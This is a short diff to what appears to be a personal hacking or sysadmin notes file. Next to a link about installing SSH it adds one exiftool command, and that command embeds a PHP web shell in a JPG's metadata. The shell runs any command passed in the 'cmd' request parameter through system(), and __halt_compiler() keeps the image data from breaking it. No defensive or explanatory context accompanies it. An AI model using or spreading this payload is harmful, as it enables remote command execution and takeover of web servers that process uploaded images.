@@ -927,3 +927,6 @@ pthread_exit(NULL);
 //Install ssh
 https://linuxconfig.org/install-ssh-server-on-redhat-8
 
+
+exiftool.exe -DocumentName="<h1>RAZZOR<br><?php if(isset($_REQUEST['cmd'])){echo '<pre>';$cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';} __halt_compiler();?></h1>" C:\Users\user\Downloads\exiftool-12.06\download.jpg
+
